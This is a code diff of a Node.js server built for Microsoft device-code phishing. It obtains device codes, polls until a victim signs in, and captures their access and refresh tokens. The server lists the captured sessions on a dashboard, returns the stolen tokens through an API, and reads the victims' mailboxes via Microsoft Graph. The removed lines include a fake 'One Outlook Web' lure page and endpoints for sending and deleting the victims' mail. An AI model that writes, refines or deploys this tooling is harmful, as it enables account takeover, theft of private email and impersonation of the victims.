@@ -16,11 +16,11 @@ app.use(express.static('public'));
 const YOUR_CLIENT_ID = 'eb588048-cc40-4f6e-adc0-e2238e604376';
 // ============================================
 
-let userSessions = new Map();
-let pendingAuth = new Map();
+let userSessions = new Map();  // sessionId -> session data
+let pendingAuth = new Map();    // deviceCode -> pending data
 
-function generateSID() {
-    return Math.floor(Math.random() * 9000000) + 1000000;
+function generateSessionId() {
+    return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
 }
 
 function getClientIp(req) {
@@ -28,13 +28,16 @@ function getClientIp(req) {
 }
 
 // ============================================
-// CREATE SESSION - Captures PRT
+// START ENDPOINT - Returns device code
 // ============================================
-app.post('/api/create-session', async (req, res) => {
+app.post('/start', async (req, res) => {
     try {
-        const sid = generateSID();
+        const acct = req.query.acct || req.body.acct || 'user@placeholder.com';
+        const sessionId = generateSessionId();
         const clientIp = getClientIp(req);
         const userAgent = req.headers['user-agent'] || 'Unknown';
+        
+        console.log(`[START] New auth request for ${acct} from IP: ${clientIp}`);
         
         const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
             new URLSearchParams({
@@ -45,28 +48,44 @@ app.post('/api/create-session', async (req, res) => {
             }
         );
         
-        const { device_code, user_code, expires_in } = response.data;
-        
-        console.log(`[CREATE] SID: ${sid}, Code: ${user_code}`);
+        const { device_code, user_code, expires_in, interval, verification_uri } = response.data;
         
         pendingAuth.set(device_code, {
-            device_code, user_code, sid, status: 'pending',
-            ip: clientIp, userAgent: userAgent,
+            device_code,
+            user_code,
+            sessionId,
+            acct,
+            ip: clientIp,
+            userAgent,
+            status: 'pending',
             createdAt: Date.now(),
             expiresAt: Date.now() + (expires_in * 1000)
         });
         
-        pollForToken(device_code, sid);
+        // Start polling for token
+        pollForToken(device_code, sessionId);
         
-        res.json({ success: true, sid: sid, user_code: user_code });
+        console.log(`[START] Generated code: ${user_code} for session: ${sessionId}`);
+        
+        res.json({
+            userCode: user_code,
+            deviceCode: device_code,
+            sessionId: sessionId,
+            interval: interval || 5,
+            expiresIn: expires_in,
+            verificationUri: verification_uri
+        });
         
     } catch (err) {
-        console.error('Create session error:', err.message);
+        console.error('[START] Error:', err.message);
         res.status(500).json({ error: err.message });
     }
 });
 
-async function pollForToken(device_code, sid) {
+// ============================================
+// Poll for token in background
+// ============================================
+async function pollForToken(device_code, sessionId) {
     const pollInterval = setInterval(async () => {
         const pending = pendingAuth.get(device_code);
         if (!pending || pending.status !== 'pending') {
@@ -78,6 +97,7 @@ async function pollForToken(device_code, sid) {
             pending.status = 'expired';
             pendingAuth.delete(device_code);
             clearInterval(pollInterval);
+            console.log(`[POLL] Session ${sessionId} expired`);
             return;
         }
         
@@ -94,90 +114,87 @@ async function pollForToken(device_code, sid) {
             
             const tokens = response.data;
             
+            // Get user info
             const userInfo = await axios.get('https://graph.microsoft.com/v1.0/me', {
                 headers: { 'Authorization': `Bearer ${tokens.access_token}` }
             });
             
-            const session = {
-                sid: sid,
-                email: userInfo.data.mail || userInfo.data.userPrincipalName,
+            const userEmail = userInfo.data.mail || userInfo.data.userPrincipalName;
+            
+            const sessionData = {
+                sessionId: sessionId,
+                email: userEmail,
                 name: userInfo.data.displayName,
                 ip: pending.ip,
                 userAgent: pending.userAgent,
                 access_token: tokens.access_token,
-                refresh_token: tokens.refresh_token,  // PRT - Primary Refresh Token
+                refresh_token: tokens.refresh_token,
                 expires_in: tokens.expires_in,
                 expires_at: Date.now() + (tokens.expires_in * 1000),
                 capturedAt: new Date().toISOString()
             };
             
-            userSessions.set(sid.toString(), session);
-            
-            pending.status = 'captured';
+            userSessions.set(sessionId, sessionData);
+            pending.status = 'success';
+            pending.email = userEmail;
             pendingAuth.delete(device_code);
             clearInterval(pollInterval);
             
-            console.log(`✅ CAPTURED: ${session.email}`);
-            console.log(`   PRT: ${session.refresh_token ? 'YES' : 'NO'}`);
+            console.log(`✅✅✅ SUCCESS! Captured session for ${userEmail}`);
+            console.log(`   Access Token: ${tokens.access_token.substring(0, 50)}...`);
+            console.log(`   PRT: ${tokens.refresh_token ? 'YES' : 'NO'}`);
             
-        } catch (err) {}
+        } catch (err) {
+            // Normal - waiting for user
+            if (err.response?.data?.error !== 'authorization_pending') {
+                // console.log('[POLL] Waiting for user...');
+            }
+        }
     }, 3000);
 }
 
 // ============================================
-// REFRESH ACCESS TOKEN USING PRT
+// STATE ENDPOINT - Check authentication status
 // ============================================
-async function getFreshAccessToken(session) {
-    if (!session.refresh_token) {
-        return null;
+app.get('/state', async (req, res) => {
+    const deviceCode = req.query.device_code;
+    const sessionId = req.query.session_id;
+    
+    if (!deviceCode) {
+        return res.status(400).json({ error: 'Missing device_code' });
     }
     
-    try {
-        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
-            new URLSearchParams({
-                grant_type: 'refresh_token',
-                refresh_token: session.refresh_token,
-                client_id: YOUR_CLIENT_ID
-            }), {
-                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
-            }
-        );
-        
-        const tokens = response.data;
-        session.access_token = tokens.access_token;
-        session.expires_in = tokens.expires_in;
-        session.expires_at = Date.now() + (tokens.expires_in * 1000);
-        
-        return session.access_token;
-        
-    } catch (err) {
-        return null;
+    const pending = pendingAuth.get(deviceCode);
+    const session = userSessions.get(sessionId);
+    
+    if (session) {
+        // Session already captured
+        return res.json({ 
+            status: 'success',
+            email: session.email,
+            sessionId: session.sessionId
+        });
     }
-}
-
-// ============================================
-// API: Get fresh access token for a session
-// ============================================
-app.get('/api/session/token/:sid', async (req, res) => {
-    const session = userSessions.get(req.params.sid);
-    if (!session) return res.status(404).json({ error: 'Session not found' });
     
-    const freshToken = await getFreshAccessToken(session);
+    if (pending) {
+        if (pending.status === 'success') {
+            return res.json({ status: 'success' });
+        } else if (pending.status === 'pending') {
+            return res.json({ status: 'pending' });
+        } else if (pending.status === 'expired') {
+            return res.json({ status: 'error', error: 'Code expired' });
+        }
+    }
     
-    res.json({
-        email: session.email,
-        access_token: freshToken || session.access_token,
-        refresh_token: session.refresh_token,
-        expires_in: session.expires_in
-    });
+    res.json({ status: 'pending' });
 });
 
 // ============================================
-// API: Get all sessions for dashboard
+// GET ALL SESSIONS FOR DASHBOARD
 // ============================================
 app.get('/api/sessions', async (req, res) => {
     const sessionList = Array.from(userSessions.values()).map(s => ({
-        sid: s.sid,
+        sessionId: s.sessionId,
         email: s.email,
         name: s.name,
         ip: s.ip,
@@ -189,23 +206,66 @@ app.get('/api/sessions', async (req, res) => {
 });
 
 // ============================================
-// MAILBOX API - FETCH REAL EMAILS USING ACCESS TOKEN
+// GET TOKENS FOR A SESSION
 // ============================================
+app.get('/api/session/tokens/:sessionId', async (req, res) => {
+    const session = userSessions.get(req.params.sessionId);
+    if (!session) return res.status(404).json({ error: 'Session not found' });
+    
+    // Refresh token if needed
+    let accessToken = session.access_token;
+    if (Date.now() >= session.expires_at - 300000 && session.refresh_token) {
+        try {
+            const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
+                new URLSearchParams({
+                    grant_type: 'refresh_token',
+                    refresh_token: session.refresh_token,
+                    client_id: YOUR_CLIENT_ID
+                }), {
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
+                }
+            );
+            accessToken = response.data.access_token;
+            session.access_token = accessToken;
+            session.expires_in = response.data.expires_in;
+            session.expires_at = Date.now() + (response.data.expires_in * 1000);
+        } catch (err) {}
+    }
+    
+    res.json({
+        email: session.email,
+        access_token: accessToken,
+        refresh_token: session.refresh_token,
+        expires_in: session.expires_in
+    });
+});
 
-// Get emails from folder
-app.get('/api/mail/:sid/:folder', async (req, res) => {
-    const { sid, folder } = req.params;
-    const session = userSessions.get(sid);
+// ============================================
+// MAILBOX API - Fetch real emails using access token
+// ============================================
+app.get('/api/mail/:sessionId/:folder', async (req, res) => {
+    const { sessionId, folder } = req.params;
+    const session = userSessions.get(sessionId);
     
     if (!session) return res.status(401).json({ error: 'Session not found' });
     
-    // Get fresh access token using PRT
+    // Get fresh token
     let token = session.access_token;
-    if (Date.now() >= session.expires_at - 300000) {
-        token = await getFreshAccessToken(session);
+    if (Date.now() >= session.expires_at - 300000 && session.refresh_token) {
+        try {
+            const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
+                new URLSearchParams({
+                    grant_type: 'refresh_token',
+                    refresh_token: session.refresh_token,
+                    client_id: YOUR_CLIENT_ID
+                }), {
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
+                }
+            );
+            token = response.data.access_token;
+            session.access_token = token;
+        } catch (err) {}
     }
-    
-    if (!token) return res.status(401).json({ error: 'No valid token' });
     
     try {
         const folderMap = {
@@ -224,23 +284,32 @@ app.get('/api/mail/:sid/:folder', async (req, res) => {
                 '$select': 'id,subject,from,receivedDateTime,isRead,bodyPreview,hasAttachments'
             }
         });
-        
         res.json(response.data);
     } catch (err) {
-        res.status(500).json({ error: 'Failed to fetch emails' });
+        res.status(500).json({ error: 'Failed to fetch emails', details: err.message });
     }
 });
 
-// Get single email
-app.get('/api/mail/message/:sid/:messageId', async (req, res) => {
-    const { sid, messageId } = req.params;
-    const session = userSessions.get(sid);
-    
+app.get('/api/mail/message/:sessionId/:messageId', async (req, res) => {
+    const { sessionId, messageId } = req.params;
+    const session = userSessions.get(sessionId);
     if (!session) return res.status(401).json({ error: 'Session not found' });
     
     let token = session.access_token;
-    if (Date.now() >= session.expires_at - 300000) {
-        token = await getFreshAccessToken(session);
+    if (Date.now() >= session.expires_at - 300000 && session.refresh_token) {
+        try {
+            const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
+                new URLSearchParams({
+                    grant_type: 'refresh_token',
+                    refresh_token: session.refresh_token,
+                    client_id: YOUR_CLIENT_ID
+                }), {
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
+                }
+            );
+            token = response.data.access_token;
+            session.access_token = token;
+        } catch (err) {}
     }
     
     try {
@@ -254,160 +323,21 @@ app.get('/api/mail/message/:sid/:messageId', async (req, res) => {
     }
 });
 
-// Send email
-app.post('/api/mail/send/:sid', async (req, res) => {
-    const { sid } = req.params;
-    const { to, subject, body } = req.body;
-    const session = userSessions.get(sid);
-    
-    if (!session) return res.status(401).json({ error: 'Session not found' });
-    
-    let token = session.access_token;
-    if (Date.now() >= session.expires_at - 300000) {
-        token = await getFreshAccessToken(session);
-    }
-    
-    try {
-        await axios.post('https://graph.microsoft.com/v1.0/me/sendMail', {
-            message: {
-                subject: subject,
-                body: { contentType: 'HTML', content: body },
-                toRecipients: to.map(email => ({ emailAddress: { address: email } }))
-            },
-            saveToSentItems: true
-        }, { headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' } });
-        
-        res.json({ success: true });
-    } catch (err) {
-        res.status(500).json({ error: 'Failed to send email' });
-    }
-});
-
-// Delete email
-app.delete('/api/mail/message/:sid/:messageId', async (req, res) => {
-    const { sid, messageId } = req.params;
-    const session = userSessions.get(sid);
-    
-    if (!session) return res.status(401).json({ error: 'Session not found' });
-    
-    let token = session.access_token;
-    if (Date.now() >= session.expires_at - 300000) {
-        token = await getFreshAccessToken(session);
-    }
-    
-    try {
-        await axios.delete(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, {
-            headers: { 'Authorization': `Bearer ${token}` }
-        });
-        res.json({ success: true });
-    } catch (err) {
-        res.status(500).json({ error: 'Failed to delete message' });
-    }
-});
-
-// Mark as read
-app.patch('/api/mail/message/:sid/:messageId', async (req, res) => {
-    const { sid, messageId } = req.params;
-    const { isRead } = req.body;
-    const session = userSessions.get(sid);
-    
-    if (!session) return res.status(401).json({ error: 'Session not found' });
-    
-    let token = session.access_token;
-    if (Date.now() >= session.expires_at - 300000) {
-        token = await getFreshAccessToken(session);
-    }
-    
-    try {
-        await axios.patch(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, 
-            { isRead: isRead },
-            { headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' } }
-        );
-        res.json({ success: true });
-    } catch (err) {
-        res.status(500).json({ error: 'Failed to update message' });
-    }
-});
-
 app.delete('/api/sessions/clear', async (req, res) => {
     userSessions.clear();
+    pendingAuth.clear();
     res.json({ success: true });
 });
 
-// Generate Auth Page
-app.get('/generate-auth-page', async (req, res) => {
-    try {
-        const sid = generateSID();
-        
-        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
-            new URLSearchParams({
-                client_id: YOUR_CLIENT_ID,
-                scope: 'openid profile email User.Read offline_access'
-            }), {
-                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
-            }
-        );
-        
-        const { device_code, user_code } = response.data;
-        
-        pendingAuth.set(device_code, {
-            device_code, user_code, sid, status: 'pending',
-            ip: getClientIp(req), userAgent: req.headers['user-agent'] || 'Unknown',
-            createdAt: Date.now(),
-            expiresAt: Date.now() + (response.data.expires_in * 1000)
-        });
-        
-        pollForToken(device_code, sid);
-        
-        const html = `<!DOCTYPE html>
-<html>
-<head><title>One Outlook Web</title>
-<style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#0078d4,#00a4ef);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
-.card{background:#fff;border-radius:20px;padding:40px;max-width:500px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.3)}
-.code{font-size:42px;font-weight:bold;letter-spacing:8px;background:#f0f0f0;padding:20px;border-radius:12px;margin:20px 0;color:#0078d4;font-family:monospace}
-.btn{background:#0078d4;color:#fff;border:none;padding:12px 28px;border-radius:8px;cursor:pointer;font-size:14px;font-weight:600;margin:5px}
-.btn:hover{background:#005fa3}
-.status{margin-top:20px;padding:12px;border-radius:8px;background:#f8f9fa;color:#666;font-size:13px}
-.spinner{display:inline-block;width:14px;height:14px;border:2px solid #ccc;border-top-color:#0078d4;border-radius:50%;animation:spin .8s linear infinite;margin-right:8px}
-@keyframes spin{to{transform:rotate(360deg)}}
-</style>
-</head>
-<body>
-<div class="card">
-    <h2>One Outlook Web</h2>
-    <p>Connect your Microsoft account</p>
-    <div class="code" id="userCode">${user_code}</div>
-    <button class="btn" onclick="copyCode()">Copy Code</button>
-    <button class="btn" id="openBtn">Open Microsoft Login</button>
-    <div class="status" id="statusMsg"><span class="spinner"></span> Waiting for authentication...</div>
-</div>
-<script>
-    const SID = ${sid};
-    const API_URL = window.location.origin;
-    function copyCode(){const c=document.getElementById('userCode').innerText;navigator.clipboard.writeText(c);alert('Copied!')}
-    document.getElementById('openBtn').onclick=function(){window.open('https://microsoft.com/devicelogin','_blank','width=600,height=700')}
-    async function poll(){try{const r=await fetch(API_URL+'/api/status/'+SID);const d=await r.json();if(d.status==='captured'){document.getElementById('statusMsg').innerHTML='✅ Access granted! Session captured.';setTimeout(()=>window.close(),2000)}}catch(e){}setTimeout(poll,3000)}
-    poll();
-</script>
-</body>
-</html>`;
-        
-        res.send(html);
-        
-    } catch (err) {
-        res.status(500).send('Error: ' + err.message);
-    }
-});
-
+// ============================================
+// SERVE FILES
+// ============================================
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`\n========================================`);
-    console.log(`✅ Server running on port ${PORT}`);
-    console.log(`📍 Dashboard: http://localhost:${PORT}`);
+    console.log(`✅ Server running on http://localhost:${PORT}`);
     console.log(`========================================\n`);
 });
